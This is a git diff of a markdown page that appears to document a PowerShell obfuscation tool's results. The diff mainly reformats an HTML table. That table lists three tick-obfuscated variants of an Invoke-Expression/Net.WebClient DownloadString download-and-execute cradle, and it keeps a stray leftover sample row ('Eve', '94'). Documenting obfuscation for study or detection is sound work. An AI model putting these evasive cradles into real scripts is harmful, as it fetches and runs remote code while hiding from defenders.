@@ -45,41 +45,21 @@ you can copy the results from all cases for one or more obfuscation methods and 
 | :---: | :---: | :---: | :---: |
 | 1 | TOKEN\COMMAND\1 | <p> inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString <br> InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString <br> I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString </p> | This option basicaly applies ticks |
 
-
-<!DOCTYPE html>
-<html>
-<head>
-<style>
-table, th, td {
-  border: 1px solid black;
-  border-collapse: collapse;
-}
-th, td {
-  padding: 5px;
-}
-th, td {
-  text-align: center;
-}
-</style>
-</head>
-<body>
-
-
-<table style="width:100%">
+<table width="600" border="1">
  <tr>
-   <th>Case #</th>
-   <th>Option</th>
-   <th>Results</th>
-   <th>Comments</th>
+   <th align="center">Case #</th>
+   <th align="center">Option</th>
+   <th align="center">Results</th>
+   <th align="center">Comments</th>
  </tr>
  <tr>
-   <td>1</td>
-   <td>TOKEN\COMMAND\1</td>
-   <td> <div>inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString</div>
+   <td align="center">1</td>
+   <td align="center">TOKEN\COMMAND\1</td>
+   <td align="center"> <div>inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString</div>
       <div>InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString</div>
       <div>I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString</div>
    </td>
-   <td>This option basicaly applies ticks</td>
+   <td align="center">This option basicaly applies ticks</td>
  </tr>
  <tr>
    <td>Eve</td>
@@ -88,7 +68,6 @@ th, td {
    <td>94</td>
  </tr>
 </table> 
-
 
 
 
